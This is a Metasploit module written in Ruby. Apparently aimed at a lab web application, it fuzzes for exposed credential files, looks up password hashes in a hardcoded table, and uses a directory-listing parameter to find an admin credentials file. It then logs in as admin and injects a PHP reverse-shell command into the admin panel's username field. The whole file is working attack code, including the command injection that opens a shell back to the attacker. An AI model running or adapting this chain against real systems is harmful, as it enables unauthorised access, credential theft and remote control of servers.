class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Enhanced Reverse Shell Injection',
      'Description'    => %q{
        This module exploits a vulnerable web application by fuzzing for files,
        extracting user credentials, and exploiting a path traversal vulnerability to locate admin credentials.
        It then authenticates as an admin and injects a reverse shell payload into the username field of the admin panel.
      },
      'Author'         => [ 'Alejandro Melendez y Ander Monreal' ],
      'License'        => MSF_LICENSE,
      'References'     => []
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, 'The base path of the application', '/' ]),
        OptInt.new('REV_PORT', [ true, 'Reverse shell port', 4444 ])
      ]
    )
  end

  def run
    target_url = normalize_uri(datastore['TARGETURI'])

    print_status("Target: #{rhost}:#{rport}#{target_url}")

    # Step 1: Fuzzing for files
    user_creds_file = fuzz_files(target_url)

    if user_creds_file
      print_good("User credentials file found: #{user_creds_file}")

      # Step 2: Extract user credentials
      user_credentials = extract_user_credentials(user_creds_file)

      if user_credentials
        print_good("User credentials extracted: #{user_credentials}")

        # Step 3: Authenticate as a normal user
        if authenticate_user(target_url, user_credentials)
          # Perform logout before switching users
          perform_logout(target_url)
          sleep(2)
          # Step 4: Perform path traversal to find admin credentials
          admin_creds_file = locate_admin_creds(target_url)

          unless admin_creds_file
            admin_creds_file = fetch_admin_creds_fallback(target_url)
          end

          if admin_creds_file
            print_good("Admin credentials file found: #{admin_creds_file}")

            # Step 5: Extract admin credentials
            admin_credentials = extract_admin_credentials(admin_creds_file)

            if admin_credentials
              print_good("Admin credentials extracted: #{admin_credentials}")
              perform_logout(target_url)

              # Step 6: Authenticate as admin
              if authenticate_user(target_url, admin_credentials)
                print_good("Successfully authenticated as admin")

                # Step 7: Deliver reverse shell payload
                deliver_reverse_shell(target_url)
              else
                print_error("Failed to authenticate as admin")
              end
            else
              print_error("Failed to extract admin credentials")
            end
          else
            print_error("Failed to find admin credentials file")
          end
        else
          print_error("Failed to authenticate as user")
        end
      else
        print_error("Failed to extract user credentials")
      end
    else
      print_error("Failed to find user credentials file")
    end
  end

  def fuzz_files(base_url)
    print_status("Fuzzing for files...")

    possible_files = ["users.json", "config.json", "data.json"]
    possible_files.each do |file|
      res = send_request_cgi({
        'uri' => normalize_uri(base_url, file),
        'method' => 'GET'
      })

      if res && res.code == 200
        return normalize_uri(base_url, file)
      end
    end

    nil
  end

  def extract_user_credentials(file_uri)
    res = send_request_cgi({
      'uri' => file_uri,
      'method' => 'GET'
    })

    if res && res.body
      print_status("Response body for user credentials:")
      print_line(res.body)

      begin
        json_data = JSON.parse(res.body)
        json_data.each do |user|
          username = user['username']
          password = user['password']

          if crack_password(password)
            return { username: username, password: crack_password(password) }
          end
        end
      rescue JSON::ParserError => e
        print_error("Failed to parse JSON from user credentials file: #{e.message}")
      end
    else
      print_error("No response or empty body when fetching user credentials file")
    end

    nil
  end

  def crack_password(hash)
    # Simulating password cracking
    password_map = {
      "736fd5e59bc62eb1fbb144b8c8706a0a13e65e9b" => "greenapple",
      "5d965f573297385c5f61d88be4d97c32e021c989" => "bluemonkey",
      "53ec18a0217472b20f662b347c74ceeda67dd1b8" => "melendez123"
    }

    password_map[hash]
  end

  def authenticate_user(base_url, credentials)
    print_status("Authenticating as user: #{credentials[:username]}")
  
    res = send_request_cgi({
      'uri' => normalize_uri(base_url, 'login.php'),
      'method' => 'POST',
      'vars_post' => {
        'username' => credentials[:username],
        'password' => credentials[:password]
      }
    })
  
    if res && res.code == 200 && res.get_cookies
      print_good("Authenticated as user: #{credentials[:username]}")
      @cookies = res.get_cookies
      return true
    elsif res && res.code == 302
      print_status("Redirect detected, fetching session cookies...")
      @cookies = res.get_cookies
      return true if @cookies
    else
      print_error("Failed to authenticate as user: #{credentials[:username]}")
      return false
    end
  end
  
  
  

  def perform_logout(base_url)
    print_status("Logging out current session...")
  
    res = send_request_cgi({
      'uri' => normalize_uri(base_url, 'logout.php'),
      'method' => 'GET',
      'cookie' => @cookies
    })
  
    if res && res.code == 302
      print_good("Logged out successfully (redirect detected)")
      @cookies = nil # Invalidar cookies manualmente
      return true
    elsif res && res.code == 200
      print_good("Logged out successfully")
      @cookies = nil
      return true
    else
      print_error("Failed to logout - Response: #{res.code} #{res.body if res}")
      return false
    end
  end
  
  

  def locate_admin_creds(base_url)
    print_status("Attempting path traversal on dashboard...")

    res = send_request_cgi({
      'uri' => normalize_uri(base_url, 'dashboard.php'),
      'vars_get' => { 'dir' => '.' },
      'method' => 'GET'
    })

    if res && res.body
      print_status("Parsing response for admin credentials file...")

      res.body.scan(/loadFileContent\('(.*adminsCreds.*\.json)'\)/).each do |match|
        print_good("Found potential admin credentials file: #{match[0]}")
        return normalize_uri(base_url, match[0])
      end
    end

    print_error("No admin credentials file found in path traversal response")
    nil
  end

  def fetch_admin_creds_fallback(base_url)
    print_status("Attempting direct fetch of admin credentials file...")

    admin_creds_file = normalize_uri(base_url, 'adminsCreds43Fb3r8723FDSbncv43.json')
    res = send_request_cgi({
      'uri' => admin_creds_file,
      'method' => 'GET'
    })

    if res && res.code == 200
      print_good("Admin credentials file fetched directly: #{admin_creds_file}")
      return admin_creds_file
    end

    print_error("Failed to fetch admin credentials file directly")
    nil
  end

  def extract_admin_credentials(file_uri)
    res = send_request_cgi({
      'uri' => file_uri,
      'method' => 'GET'
    })

    if res && res.body
      print_status("Extracting admin credentials from response body...")
      print_line(res.body)

      begin
        json_data = JSON.parse(res.body)
        json_data.each do |admin|
          username = admin['username']
          password = admin['password']

          if crack_password(password)
            return { username: username, password: crack_password(password) }
          end
        end
      rescue JSON::ParserError => e
        print_error("Failed to parse JSON from admin credentials file: #{e.message}")
      end
    else
      print_error("No response or empty body when fetching admin credentials file")
    end

    nil
  end

  def deliver_reverse_shell(base_url)
    reverse_ip = Rex::Socket.source_address(rhost)
    reverse_port = datastore['REV_PORT']
  
    payload = "; php -r '$sock=fsockopen(\"#{reverse_ip}\",#{reverse_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");' #"
  
    print_status("Injecting reverse shell payload through admin panel...")
  
    res = send_request_cgi({
      'uri' => normalize_uri(base_url, 'admin.php'),
      'method' => 'POST',
      'cookie' => @cookies,
      'vars_post' => {
        'username' => payload,
        'email' => "exploit@example.com",
        'phone' => "1234567890",
        'address' => "123 Elm Street",
        'password' => "password",
        'submit' => 'Save New User'
      }
    })
  
    if res && res.code == 200
      print_good("Reverse shell payload delivered successfully")
    else
      print_error("Failed to deliver reverse shell payload")
    end
  end
  
end
